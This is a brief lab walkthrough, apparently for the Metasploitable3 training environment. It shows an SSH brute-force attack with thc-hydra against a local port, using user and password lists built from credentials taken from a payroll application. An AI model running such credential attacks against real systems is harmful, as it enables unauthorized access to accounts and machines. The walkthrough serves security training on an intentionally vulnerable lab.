# SSH Bruteforce with thc-hydra

1. After extracting credentials from the Payroll Application, use the credentials to run a bruteforce attack.

```
hydra -L user.txt -P pass.txt ssh://127.0.0.1:2222
```
![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/ssh-bruteforce/SSH_Bruteforce.png "Result 1")
